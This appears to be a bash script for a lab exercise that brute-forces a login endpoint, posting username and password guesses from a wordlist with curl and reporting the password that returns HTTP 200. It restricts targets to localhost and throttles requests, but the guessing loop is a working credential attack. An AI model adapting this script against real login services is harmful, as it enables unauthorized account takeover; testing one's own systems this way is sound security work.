#!/usr/bin/env bash
set -uo pipefail

# Usage: ./brute_force.sh http://127.0.0.1:8000 admin passwords.txt
# Optional: VERBOSE=1 ./brute_force.sh ...

TARGET="${1:-}"
USER="${2:-}"
WORDLIST="${3:-}"

if [[ -z "$TARGET" || -z "$USER" || -z "$WORDLIST" ]]; then
  echo "Usage: $0 TARGET USER WORDLIST"
  echo "Example: $0 http://127.0.0.1:8000 admin passwords.txt"
  exit 2
fi

# safety: only allow localhost targets
HOST=$(echo "$TARGET" | sed -E 's@https?://@@' | cut -d'/' -f1 | cut -d':' -f1)
if [[ "$HOST" != "127.0.0.1" && "$HOST" != "localhost" ]]; then
  echo "ERROR: only localhost/127.0.0.1 targets are allowed for safety."
  exit 3
fi

if [[ ! -f "$WORDLIST" ]]; then
  echo "ERROR: wordlist not found: $WORDLIST"
  exit 4
fi

LOGIN_ENDPOINT="${TARGET%/}/login"
total=0
found=""
VERBOSE="${VERBOSE:-0}"

trap 'echo; echo "Interrupted by user."; echo "Attempts so far: $total"; exit 130' INT

echo "Starting controlled brute force against $LOGIN_ENDPOINT for user '$USER'"
echo "Using wordlist: $WORDLIST"
echo

start_ts=$(date +%s)

while IFS= read -r pass || [[ -n "$pass" ]]; do
  # remove Windows CR if present
  pass_trim=$(printf "%s" "$pass" | tr -d '\r')
  # skip empty lines
  if [[ -z "$pass_trim" ]]; then
    continue
  fi

  ((total++))
  payload=$(printf '{"username":"%s","password":"%s"}' "$USER" "$pass_trim")

  if [[ "$VERBOSE" -eq 1 ]]; then
    printf "[DEBUG] payload: %s\n" "$payload" >&2
  fi

  # send request; -s silent but -S show errors; append http code after a colon
  resp=$(curl -sS -w ":%{http_code}" -X POST -H "Content-Type: application/json" -d "$payload" "$LOGIN_ENDPOINT" 2>/dev/null || echo ":000")
  body=${resp%:*}
  code=${resp##*:}

  # normalize newlines in body for single-line logging
  single_body=$(echo "$body" | tr '\n' ' ' | sed 's/  */ /g' | sed 's/^ //; s/ $//')

  printf "[%3s] pwd='%s' -> %s\n" "$code" "$pass_trim" "$single_body"

  if [[ "$code" == "200" ]]; then
    found="$pass_trim"
    break
  fi

  # small delay to avoid flooding (adjust to taste)
  sleep 0.05
done < "$WORDLIST"

end_ts=$(date +%s)
elapsed=$((end_ts - start_ts))

echo
echo "Finished. Total attempts: $total"
echo "Elapsed (s): $elapsed"
if [[ -n "$found" ]]; then
  echo "Found password: $found"
else
  echo "No password found in wordlist."
fi
